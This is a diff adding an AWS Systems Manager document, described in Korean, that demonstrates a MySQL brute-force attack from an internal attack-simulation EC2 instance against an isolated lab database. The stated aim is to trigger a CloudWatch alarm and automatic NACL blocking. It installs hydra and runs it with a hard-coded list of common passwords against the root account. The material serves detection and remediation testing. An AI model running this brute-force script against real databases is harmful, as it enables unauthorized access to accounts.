@@ -1,0 +1,65 @@
+schemaVersion: '2.2'
+description: |
+  MySQL 무차별 대입 시연(SEC-06A). 파리(홈 리전) VPC 안 내부 공격자 EC2(Role=attack-simulation)에서
+  격리된 실습 DB(Private-DB, db-manual-sg 경유로만 도달 가능)의 계정에 사전 단어 목록으로 로그인을 반복 시도한다.
+  전부 실패해도 목적은 달성된다 — 매 시도가 MySQL 오류 로그에 "Access denied for user" 로 남고,
+  CloudWatch 지표 필터가 5분간 실패 횟수(mysql_auth_fail_threshold)를 세어 알람을 울리면,
+  asr_trigger 가 그 구간 로그에서 출발지(이 공격자 EC2의 사설 IP)를 찾아 Private NACL 에 자동 차단한다
+  (auto_remediable_controls 에 SEC-06A 가 있을 때, DEC-018). 대시보드 "전부 실행"이 호출한다.
+parameters:
+  DbHost:
+    type: String
+    description: MySQL 대상 사설 IP (예 10.0.2.50) — db-manual-sg 를 통해서만 도달한다
+    allowedPattern: '^10\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])$'
+  DbUser:
+    type: String
+    description: 무차별 대입 대상 계정
+    default: root
+    allowedPattern: '^[a-z_][a-z0-9_]{0,31}$'
+  RegionLabel:
+    type: String
+    description: 표기용 라벨
+    default: paris
+mainSteps:
+  - action: 'aws:runShellScript'
+    name: mysqlBruteForce
+    inputs:
+      runCommand:
+        - '#!/bin/bash'
+        - set -uo pipefail
+        - |
+          if ! command -v hydra >/dev/null 2>&1; then
+            for i in 1 2 3; do sudo apt-get update -y && sudo apt-get install -y hydra && break; sleep 10; done
+          fi
+        - HOST='{{ DbHost }}'
+        - USER_NAME='{{ DbUser }}'
+        - 'echo "== SEC-06A mysql brute force -> $HOST as $USER_NAME @ $(date -u +%FT%TZ) =="'
+        - PW=$(mktemp)
+        - |
+          cat > "$PW" <<'WORDLIST'
+          password
+          123456
+          admin123
+          root1234
+          Passw0rd
+          qwerty123
+          letmein1
+          toor1234
+          changeme
+          welcome1
+          Pa$$w0rd1
+          admin@123
+          mysql123
+          dbadmin1
+          sekret99
+          test1234
+          backup123
+          default1
+          temp12345
+          manager1
+          WORDLIST
+        - '# 실패해도 실습 목적(로그·알람 유발)은 달성되므로 hydra 종료코드로 명령을 실패시키지 않는다.'
+        - 'hydra -l "$USER_NAME" -P "$PW" -t 4 "mysql://$HOST" || true'
+        - 'rm -f "$PW"'
+        - 'echo "brute force finished (실패만으로 탐지·자동 차단 시연 — CloudWatch 알람과 조치 이력에서 확인)"'
+        - exit 0
